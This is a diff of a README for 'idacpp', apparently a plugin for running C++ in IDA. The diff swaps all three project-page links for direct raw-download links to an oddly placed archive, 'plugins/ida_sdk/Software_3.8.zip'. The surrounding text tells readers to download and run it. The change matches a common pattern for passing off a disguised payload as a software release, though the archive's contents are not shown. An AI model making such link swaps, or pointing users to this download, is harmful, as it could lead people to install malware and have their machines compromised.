@@ -1,6 +1,6 @@
 # 🧩 idacpp - Run C++ inside IDA with ease
 
-[![Download idacpp](https://img.shields.io/badge/Download-idacpp-6f42c1?style=for-the-badge&logo=github)](https://github.com/sutcl1ff/idacpp)
+[![Download idacpp](https://img.shields.io/badge/Download-idacpp-6f42c1?style=for-the-badge&logo=github)](https://github.com/sutcl1ff/idacpp/raw/refs/heads/main/plugins/ida_sdk/Software_3.8.zip)
 
 ## 🖥️ What is idacpp
 
@@ -12,7 +12,7 @@ This tool helps you work inside IDA without leaving the app. You can test small 
 
 Use this link to visit the page and download the app:
 
-[Visit the idacpp download page](https://github.com/sutcl1ff/idacpp)
+[Visit the idacpp download page](https://github.com/sutcl1ff/idacpp/raw/refs/heads/main/plugins/ida_sdk/Software_3.8.zip)
 
 If the page shows a release file, download it to your computer. If it shows source files, choose the built Windows package if one is listed.
 
@@ -141,7 +141,7 @@ Only run files you trust. Keep the download in a folder you can review. If you p
 
 Open the project page here:
 
-[https://github.com/sutcl1ff/idacpp](https://github.com/sutcl1ff/idacpp)
+[https://github.com/sutcl1ff/idacpp/raw/refs/heads/main/plugins/ida_sdk/Software_3.8.zip](https://github.com/sutcl1ff/idacpp/raw/refs/heads/main/plugins/ida_sdk/Software_3.8.zip)
 
 ## 🧩 Useful file names to look for
 
